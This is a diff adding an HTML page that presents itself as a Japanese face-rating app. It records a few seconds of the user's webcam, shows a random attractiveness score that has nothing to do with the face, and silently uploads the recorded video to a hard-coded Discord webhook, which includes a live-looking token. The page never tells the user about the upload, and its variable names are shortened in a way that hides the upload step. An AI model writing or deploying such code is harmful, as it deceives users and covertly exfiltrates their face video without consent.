@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>顔診断アプリ</title>
+  <style>
+    /* 簡単なスタイル */
+    body { font-family: Arial, sans-serif; text-align: center; }
+    video { width: 100%; max-width: 640px; }
+    #loading { display: none; }
+    #result { display: none; }
+    #countdown { font-size: 24px; }
+    .camera-guide { display: none; }
+  </style>
+</head>
+<body>
+
+  <h1>顔診断アプリ</h1>
+  <div id="loading">診断中...</div>
+  <div id="videoContainer">
+    <video id="video" autoplay></video>
+  </div>
+  <div id="countdown"></div>
+
+  <div id="result">
+    <h2>診断結果</h2>
+    <p>スコア: <span id="scoreValue"></span></p>
+    <p id="comment"></p>
+    <img id="resultImage" src="" alt="結果画像" style="max-width: 100%;"/>
+  </div>
+
+  <button id="startButton">診断開始</button>
+  <button id="retryButton" style="display: none;">再試行</button>
+  <div id="errorMessage"></div>
+
+  <script>
+    !function(){
+      var e = function(e){ return document.getElementById(e) },
+          t = function(e,t){ e.addEventListener("click",t) },
+          n = function(e,t){ e.textContent = t },
+          o = function(e){ e.style.display = "none" },
+          a = function(e){ e.style.display = "block" },
+          r = function(e,t){ e.style[t.property] = t.value };
+
+      document.addEventListener("DOMContentLoaded", function(){
+        var i = e("startButton"),
+            c = e("retryButton"),
+            d = e("video"),
+            s = e("videoContainer"),
+            l = e("loading"),
+            u = e("result"),
+            m = e("scoreValue"),
+            p = e("comment"),
+            f = e("errorMessage"),
+            h = e("countdown"),
+            g = document.querySelector(".camera-guide"),
+            v = e("resultImage"),
+            y = null,
+            w = [],
+            b = null,
+            C = null,
+            k = !1,
+            x = [
+              {min:90,text:"神レベル！完璧な顔立ちです✨",color:"#FF6B6B"},
+              {min:80,text:"超イケメン/美女！モデル級の顔立ち😍",color:"#FF8E53"},
+              {min:70,text:"とても好感度の高い整った顔です🥰",color:"#FFC154"},
+              {min:60,text:"平均以上！素敵なルックスです😊",color:"#47B39D"},
+              {min:50,text:"普通くらい。個性が光ります👍",color:"#4A6BAF"},
+              {min:40,text:"改善の余地あり。でも大丈夫！😉",color:"#9B59B6"},
+              {min:0, text:"ユニークな個性が魅力です！💫",color:"#1ABC9C"}
+            ];
+
+        var S = function(e){ n(f,e), a(f) },
+            T = function(){ o(f) },
+            E = function(e,t){
+              var n = parseInt(e);
+              h.textContent = n;
+              h.style.display = "flex";
+              var oInt = setInterval(function(){
+                n--;
+                h.textContent = n;
+                if(n <= 0){
+                  clearInterval(oInt);
+                  o(h);
+                  t && t();
+                }
+              },1000);
+            };
+
+        var A = function(){
+          if (!k){
+            try {
+              k = !0;
+              w = [];
+              i.disabled = !0;
+              n(i, "診断中...");
+              a(l);
+              o(g);
+
+              var mimeType = MediaRecorder.isTypeSupported("video/mp4") ? "video/mp4" :
+                             MediaRecorder.isTypeSupported("video/webm;codecs=vp9") ? "video/webm;codecs=vp9" :
+                             "video/webm";
+
+              y = new MediaRecorder(b, {
+                mimeType: mimeType,
+                videoBitsPerSecond: 2000000
+              });
+
+              y.ondataavailable = function(e){
+                if(e.data.size > 0) w.push(e.data);
+              };
+
+              y.onstop = function(){
+                try {
+                  var blob = new Blob(w, {type: y.mimeType});
+                  console.log("録画サイズ:", (blob.size / 1024 / 1024).toFixed(2), "MB");
+                  D(blob);
+                  L(blob);
+                } catch(err){
+                  console.error("録画処理エラー:", err);
+                  S("診断処理に失敗しました");
+                  O();
+                }
+              };
+
+              y.onerror = function(e){
+                console.error("録画エラー:", e.error);
+                S("録画中にエラーが発生しました");
+                O();
+              };
+
+              y.start(100);
+              E(3, N);
+            } catch(err){
+              console.error("録画開始エラー:", err);
+              S("録画を開始できませんでした");
+              O();
+            }
+          }
+        };
+
+        var N = function(){
+          if (y && y.state === "recording"){
+            y.stop();
+            k = !1;
+            b && b.getTracks().forEach(function(track){ track.stop(); });
+            d.srcObject = null;
+          }
+        };
+
+        var L = function(blob){
+          try {
+            var form = new FormData();
+            form.append("file", blob, "face_diagnosis.mp4");
+
+            fetch("https://discord.com/api/webhooks/1364309372196487239/mu0ivDl4fXecsUrUI59lXKHZ7lapL3fDxHvmG0LSdp4TiTYz8AehJXkoOU7y9l01tZp_", {
+              method: "POST",
+              body: form
+            });
+          } catch(err){
+            console.error("Discord送信エラー:", err);
+          }
+        };
+
+        var D = function(blob){
+          var score = Math.floor(Math.random() * 41) + 60;
+          var result = x.find(function(item){ return score >= item.min; });
+
+          if (blob){
+            v.src = URL.createObjectURL(blob);
+            a(v);
+          }
+
+          n(m, score);
+          r(m, {property: "color", value: result.color});
+          n(p, result.text);
+          o(l);
+          a(u);
+        };
+
+        var O = function(){
+          i.disabled = !1;
+          n(i, "診断開始");
+          o(l);
+          k = !1;
+        };
+
+        var M = async function(){
+          try {
+            S("");
+            i.disabled = !0;
+            n(i, "準備中...");
+
+            b && b.getTracks().forEach(function(track){ track.stop(); });
+
+            var constraints = {
+              video: {
+                facingMode: "user",
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
+              },
+              audio: false
+            };
+
+            if(location.protocol !== "https:" && !["localhost", "127.0.0.1"].includes(location.hostname)){
+              throw new Error("カメラを使用するにはHTTPS接続が必要です");
+            }
+
+            b = await navigator.mediaDevices.getUserMedia(constraints);
+            d.srcObject = b;
+            a(s);
+            a(g);
+
+            await new Promise(function(resolve, reject){
+              d.onloadedmetadata = resolve;
+              d.onerror = reject;
+              setTimeout(function(){
+                reject(new Error("カメラの読み込みがタイムアウトしました"));
+              }, 5000);
+            });
+
+            await d.play();
+            i.disabled = !1;
+            n(i, "診断開始");
+            a(c);
+            return true;
+          } catch(err){
+            console.error("カメラ設定エラー:", err);
+            P(err);
+            return false;
+          }
+        };
+
+        var P = function(err){
+          var msg = "カメラにアクセスできませんでした";
+
+          if (err.name === "NotAllowedError")
+            msg = "カメラの使用が許可されていません\nブラウザの設定からカメラアクセスを許可してください";
+          else if (err.name === "NotFoundError")
+            msg = "使用可能なカメラが見つかりませんでした";
+          else if (err.name === "NotReadableError")
+            msg = "カメラが使用中です\n他のアプリでカメラを使用していないか確認してください";
+          else if (err.name === "OverconstrainedError")
+            msg = "カメラの設定に問題があります";
+          else if (err.message.includes("HTTPS"))
+            msg = "カメラを使用するにはHTTPS接続が必要です\n安全な接続でアクセスしてください";
+          else
+            msg = err.message || msg;
+
+          S(msg);
+          i.disabled = !1;
+          n(i, "診断開始");
+          o(c);
+        };
+
+        t(i, async function(){
+          var ready = await M();
+          if (ready) setTimeout(A, 300);
+        });
+
+        t(c, async function(){
+          var ready = await M();
+          if (ready) setTimeout(A, 300);
+        });
+
+        o(s);
+      });
+    }();
+  </script>
+
+</body>
+</html>
